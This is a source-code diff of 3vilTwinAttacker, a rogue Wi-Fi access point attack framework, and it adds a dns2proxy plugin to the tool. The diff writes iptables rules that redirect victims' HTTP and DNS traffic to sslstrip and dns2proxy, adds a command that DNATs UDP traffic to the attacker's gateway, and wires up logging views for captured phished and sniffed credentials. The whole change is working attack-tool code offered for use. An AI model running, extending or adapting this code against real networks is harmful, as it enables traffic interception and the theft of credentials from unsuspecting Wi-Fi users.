@@ -21,6 +21,7 @@ from sys import argv
 import logging
 from re import search
 from time import asctime
+from ast import literal_eval
 from subprocess import Popen,PIPE,STDOUT,call,check_output,CalledProcessError
 from Modules.ModuleStarvation import frm_dhcp_main
 from Modules.ModuleDeauth import frm_window
@@ -28,7 +29,7 @@ from Modules.ModuleMacchanger import frm_mac_generator
 from Modules.ModuleProbeRequest import frm_PMonitor
 from Modules.ModuleUpdateFake import frm_update_attack
 from Modules.ModuleArpPosion import frm_Arp_Poison
-from Modules.Credentials import frm_get_credentials,frm_NetCredsLogger
+from Modules.Credentials import frm_get_credentials,frm_NetCredsLogger,frm_dns2proxy
 from Modules.ModuleDnsSpoof import frm_DnsSpoof
 from Modules.ModuleTemplates import frm_template
 from Modules.utils import ProcessThread,Refactor,setup_logger,set_monitor_mode
@@ -44,8 +45,8 @@ if search('/usr/share/',argv[0]):chdir('/usr/share/3vilTwinAttacker/')
 author      = 'Marcos Nesster @mh4x0f P0cl4bs Team'
 emails      = ['mh4root@gmail.com','p0cl4bs@gmail.com']
 license     = 'MIT License (MIT)'
-version     = '0.6.7'
-update      = '11/05/2015'
+version     = '0.6.8'
+update      = '12/04/2015'
 desc        = ['Framework for Rogue Wi-Fi Access Point Attacks']
 
 class Initialize(QMainWindow):
@@ -128,20 +129,74 @@ class Threadsslstrip(QThread):
         print 'Stop thread:' + self.objectName()
         try:
             reactor.stop()
+            reactor.crach()
         except:pass
 
 class PopUpPlugins(QWidget):
-    def __init__(self):
+    def __init__(self,FSettings):
         QWidget.__init__(self)
+        self.FSettings = FSettings
         self.layout = QVBoxLayout(self)
         self.title = QLabel('::Available Plugins::')
         self.check_sslstrip = QCheckBox('::ssLstrip')
         self.check_netcreds = QCheckBox('::net-creds')
-        self.check_sslstrip.setChecked(True)
-        self.check_netcreds.setChecked(True)
+        self.check_dns2proy = QCheckBox('::dns2proxy')
+        self.check_dns2proy.clicked.connect(self.checkBoxDns2proxy)
+        self.check_sslstrip.clicked.connect(self.checkBoxSslstrip)
+        self.check_netcreds.clicked.connect(self.checkBoxNecreds)
         self.layout.addWidget(self.title)
         self.layout.addWidget(self.check_sslstrip)
         self.layout.addWidget(self.check_netcreds)
+        self.layout.addWidget(self.check_dns2proy)
+    # control checkbox plugins
+    def checkBoxSslstrip(self):
+        if not self.check_sslstrip.isChecked():
+            self.unset_Rules('sslstrip')
+            self.FSettings.xmlSettings('sslstrip_plugin','status','False',False)
+        elif self.check_sslstrip.isChecked():
+            self.set_sslStripRule()
+            self.FSettings.xmlSettings('sslstrip_plugin','status','True',False)
+    def checkBoxDns2proxy(self):
+        if not self.check_dns2proy.isChecked():
+            self.unset_Rules('dns2proxy')
+            self.FSettings.xmlSettings('dns2proxy_plugin','status','False',False)
+        elif self.check_dns2proy.isChecked():
+            self.set_Dns2proxyRule()
+            self.FSettings.xmlSettings('dns2proxy_plugin','status','True',False)
+    def checkBoxNecreds(self):
+        if self.check_netcreds.isChecked():
+            self.FSettings.xmlSettings('netcreds_plugin','status','True',False)
+        else:
+            self.FSettings.xmlSettings('netcreds_plugin','status','False',False)
+
+    # set rules to sslstrip
+    def set_sslStripRule(self):
+        item = QListWidgetItem()
+        item.setText('iptables -t nat -A PREROUTING -p '+
+        'tcp --destination-port 80 -j REDIRECT --to-port '+self.FSettings.redirectport.text())
+        item.setSizeHint(QSize(30,30))
+        self.FSettings.ListRules.addItem(item)
+    # set redirect port rules dns2proy
+    def set_Dns2proxyRule(self):
+        item = QListWidgetItem()
+        item.setText('iptables -t nat -A PREROUTING -p '+
+        'udp --destination-port 53 -j REDIRECT --to-port 53')
+        item.setSizeHint(QSize(30,30))
+        self.FSettings.ListRules.addItem(item)
+
+    def unset_Rules(self,type):
+        items = []
+        for index in xrange(self.FSettings.ListRules.count()):
+            items.append(str(self.FSettings.ListRules.item(index).text()))
+        for i,j in enumerate(items):
+            if type == 'sslstrip':
+                if search(str('tcp --destination-port 80 -j REDIRECT --to-port '+
+                    self.FSettings.redirectport.text()),j):
+                    self.FSettings.ListRules.takeItem(i)
+            elif type =='dns2proxy':
+                if search('udp --destination-port 53 -j REDIRECT --to-port 53',j):
+                    self.FSettings.ListRules.takeItem(i)
+
 
 class PopUpServer(QWidget):
     def __init__(self,FSettings):
@@ -152,13 +207,12 @@ class PopUpServer(QWidget):
         self.GridForm   = QGridLayout()
         self.StatusLabel        = QLabel(self)
         self.title              = QLabel('::Server-HTTP::')
-        self.checkRedirectIP    = QCheckBox('Add Redirect Rules')
         self.btntemplates       = QPushButton('Templates')
         self.btnStopServer      = QPushButton('Stop Server')
         self.btnRefresh         = QPushButton('ReFresh')
         self.txt_IP             = QLineEdit(self)
+        self.txt_IP.setVisible(False)
         self.ComboIface         = QComboBox(self)
-        self.checkRedirectIP.setFixedHeight(30)
         self.StatusServer(False)
         #icons
         self.btntemplates.setIcon(QIcon('rsc/page.png'))
@@ -170,37 +224,17 @@ class PopUpServer(QWidget):
         self.btntemplates.clicked.connect(self.show_template_dialog)
         self.btnStopServer.clicked.connect(self.StopLocalServer)
         self.btnRefresh.clicked.connect(self.refrash_interface)
-        self.checkRedirectIP.clicked.connect(self.addRulesRedirect)
         self.connect(self.ComboIface, SIGNAL("currentIndexChanged(QString)"), self.discoveryIface)
 
         #layout
-        self.GridForm.addWidget(self.txt_IP,0,0)
         self.GridForm.addWidget(self.ComboIface,0,1)
         self.GridForm.addWidget(self.btnRefresh,0,2)
-        self.GridForm.addWidget(self.checkRedirectIP,1,0)
         self.GridForm.addWidget(self.btntemplates,1,1)
         self.GridForm.addWidget(self.btnStopServer,1,2)
         self.FormLayout.addRow(self.title)
         self.FormLayout.addRow(self.GridForm)
         self.FormLayout.addRow('Status::',self.StatusLabel)
         self.layout.addLayout(self.FormLayout)
-
-    def addRulesRedirect(self):
-        if self.checkRedirectIP.isChecked():
-            item = QListWidgetItem()
-            item.setText('iptables -t nat -A PREROUTING -p '+
-            'tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80')
-            item.setSizeHint(QSize(30,30))
-            self.FSettings.ListRules.addItem(item)
-            self.FSettings.check_redirect.setChecked(True)
-            return
-        items = []
-        for index in xrange(self.FSettings.ListRules.count()):
-            items.append(str(self.FSettings.ListRules.item(index).text()))
-        for i,j in enumerate(items):
-            if search('--to-destination 10.0.0.1:80',j):
-                self.FSettings.ListRules.takeItem(i)
-                self.FSettings.check_redirect.setChecked(False)
 
 
     def emit_template(self,log):
@@ -250,8 +284,9 @@ class SubMain(QWidget):
         self.Ap_iface       = None
         self.ProgramCheck   = []
         self.FSettings      = frm_Settings()
-        self.PopUpPlugins   = PopUpPlugins()
+        self.PopUpPlugins   = PopUpPlugins(self.FSettings)
         self.setGeometry(0, 0, 300, 400)
+        self.checkPlugins()
         self.intGUI()
 
     def intGUI(self):
@@ -278,16 +313,20 @@ class SubMain(QWidget):
         exportAction.triggered.connect(self.exportHTML)
 
         Menu_View = self.myQMenuBar.addMenu('&View')
-        phishinglog = QAction('Credentials Phishing', self)
-        netcredslog = QAction('Credentials NetCreds', self)
+        phishinglog = QAction('Monitor Phishing', self)
+        netcredslog = QAction('Monitor NetCreds', self)
+        dns2proxylog = QAction('Monitor Dns2proxy', self)
         #connect
         phishinglog.triggered.connect(self.credentials)
         netcredslog.triggered.connect(self.logsnetcreds)
+        dns2proxylog.triggered.connect(self.logdns2proxy)
         #icons
         phishinglog.setIcon(QIcon('rsc/password.png'))
         netcredslog.setIcon(QIcon('rsc/logger.png'))
+        dns2proxylog.setIcon(QIcon('rsc/proxy.png'))
         Menu_View.addAction(phishinglog)
         Menu_View.addAction(netcredslog)
+        Menu_View.addAction(dns2proxylog)
 
         #tools Menu
         Menu_tools = self.myQMenuBar.addMenu('&Tools')
@@ -505,6 +544,21 @@ class SubMain(QWidget):
         self.FnetCreds.setWindowTitle('NetCreds Logger')
         self.FnetCreds.show()
 
+    def logdns2proxy(self):
+        self.Fdns2proxy = frm_dns2proxy()
+        self.Fdns2proxy.setWindowTitle('Dns2proxy Logger')
+        self.Fdns2proxy.show()
+
+    def checkPlugins(self):
+        if literal_eval(self.FSettings.xmlSettings('sslstrip_plugin','status',None,False)):
+            self.PopUpPlugins.check_sslstrip.setChecked(True)
+            self.PopUpPlugins.set_sslStripRule()
+        if literal_eval(self.FSettings.xmlSettings('netcreds_plugin','status',None,False)):
+            self.PopUpPlugins.check_netcreds.setChecked(True)
+        if literal_eval(self.FSettings.xmlSettings('dns2proxy_plugin','status',None,False)):
+            self.PopUpPlugins.check_dns2proy.setChecked(True)
+            self.PopUpPlugins.set_Dns2proxyRule()
+
     def Started(self,bool):
         if bool:
             self.StatusDhcp.setText("[ON]")
@@ -526,7 +580,7 @@ class SubMain(QWidget):
         except:pass
         self.EditApName.setText(self.FSettings.xmlSettings('AP', 'name',None,False))
         self.EditChannel.setText(self.FSettings.xmlSettings('channel', 'mchannel',None,False))
-        self.PortRedirect = self.FSettings.xmlSettings('redirect', 'port',None,False)
+        self.PortRedirect = self.FSettings.redirectport.text()
         for i,j in enumerate(self.get_interfaces['all']):
             if search('wlan', j):self.selectCard.addItem(self.get_interfaces['all'][i])
         driftnet = popen('which driftnet').read().split('\n')
@@ -560,6 +614,9 @@ class SubMain(QWidget):
         for kill in self.SettingsAP['kill']:popen(kill)
         set_monitor_mode(self.interface).setDisable()
         self.Started(False)
+        self.FormPopup.Ftemplates.killThread()
+        self.FormPopup.StatusServer(False)
+        self.btn_start_attack.setDisabled(False)
         Refactor.set_ip_forward(0)
         self.ListLoggerDhcp.clear()
 
@@ -664,6 +721,7 @@ class SubMain(QWidget):
 
     def StartApFake(self):
         self.ListLoggerDhcp.clear()
+        self.btn_start_attack.setDisabled(True)
         if geteuid() != 0:
             return QMessageBox.warning(self,'Error permission','Run as root ')
         if len(self.selectCard.currentText()) == 0:
@@ -746,6 +804,9 @@ class SubMain(QWidget):
         else:return QMessageBox.information(self,'DHCP',selected_dhcp + ' not found.')
         self.Started(True)
         self.FSettings.xmlSettings('statusAP','value','True',False)
+        if self.FSettings.check_redirect.isChecked():
+            popen('iptables -t nat -A PREROUTING -p udp -j DNAT --to {}'.format(str(self.EditGateway.text())))
+            self.PopUpPlugins.unset_Rules('sslstrip')
 
         # thread plugins
         if self.PopUpPlugins.check_sslstrip.isChecked():
@@ -760,6 +821,12 @@ class SubMain(QWidget):
             Thread_netcreds.setName('Net-Creds')
             self.Apthreads['RougeAP'].append(Thread_netcreds)
             Thread_netcreds.start()
+
+        if self.PopUpPlugins.check_dns2proy.isChecked():
+            Thread_dns2proxy = ProcessThread(['python','Plugins/dns2proxy/dns2proxy.py'])
+            Thread_dns2proxy.setName('Dns2Proxy')
+            self.Apthreads['RougeAP'].append(Thread_dns2proxy)
+            Thread_dns2proxy.start()
 
         iptables = []
         for index in xrange(self.FSettings.ListRules.count()):
